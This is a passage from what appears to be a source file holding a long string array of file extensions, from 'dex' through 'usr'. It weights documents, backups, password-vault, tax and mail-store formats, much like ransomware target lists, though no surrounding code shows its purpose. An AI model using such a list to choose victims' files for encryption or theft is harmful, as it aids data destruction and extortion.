					"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
					"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
					"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
					"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
					"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
					"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
					"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
					"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
					"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
					"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
					"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
					"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
					"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
					"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
					"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
					"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
					"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
					"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
					"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
					"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
					"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
					"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
					"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
					"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
					"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
					"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
					"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
					"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
					"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
					"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
					"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
					"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
					"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
					"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
					"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
					"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
					"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
					"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
					"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
					"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
					"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
					"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
					"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
					"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
					"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
					"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
					"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
					"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
					"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
					"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
					"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
					"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
					"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
					"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
					"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
					"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
					"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
					"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
					"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
					"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
					"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
					"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
					"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
					"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
					"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
					"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
					"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
					"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
					"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
					"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
					"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
					"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
					"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
					"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
					"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
					"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
					"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
					"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
					"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
					"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
					"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
					"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
					"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
					"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
					"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
					"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
					"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
					"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
					"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
					"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
					"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
					"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
					"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
					"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
					"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
					"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
					"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
					"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
					"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
					"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
					"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
					"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
					"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
					"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
					"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
					"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
					"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
					"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
					"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
					"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
					"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
					"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
					"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
					"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
					"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
					"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
					"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
					"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
					"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
					"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
					"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
					"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
					"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
					"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
					"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
					"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
					"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
					"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
					"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
					"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
					"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
					"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
					"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
					"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
					"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
					"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
					"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
					"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
					"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
					"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
					"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
					"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
					"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
					"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
					"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
					"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
					"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
					"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
					"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
					"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
					"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
					"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
					"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
					"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
					"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
					"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
					"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
					"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
					"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
					"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
					"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
					"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
					"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
					"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
					"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
					"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
					"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
					"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
					"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
					"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
					"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
					"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
					"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
					"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
					"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
					"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
					"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
					"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
					"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
					"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
					"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
					"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
					"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
					"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
					"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
					"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
					"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
					"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
					"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
					"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
					"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
					"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
					"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
					"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
					"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
					"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
					"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
					"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
					"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
					"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
					"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
					"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
					"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
					"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
					"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
					"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
					"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
					"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
					"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
					"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
					"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
					"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
					"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
					"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
					"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
					"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
					"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
					"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
					"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
					"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
					"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
					"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
					"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
					"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
					"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
					"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
					"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
					"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
					"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
					"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
					"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
					"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
					"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
					"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
					"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
					"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
					"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
					"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
					"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
					"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
					"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
					"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
					"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
					"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
					"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
					"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
					"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
					"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
					"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
					"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
					"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
					"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
					"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
					"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
					"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
					"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
					"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
					"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
					"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
					"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
					"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
					"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
					"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
					"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
					"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
					"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
					"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
					"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
					"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
					"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
					"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
					"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
					"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
					"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
					"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
					"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
					"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
					"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
					"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
					"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
					"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
					"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
					"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
					"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
					"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
					"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
					"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
					"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
					"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
					"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
					"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
					"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
					"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
					"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
					"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
					"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
					"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
					"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
					"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
					"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
					"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
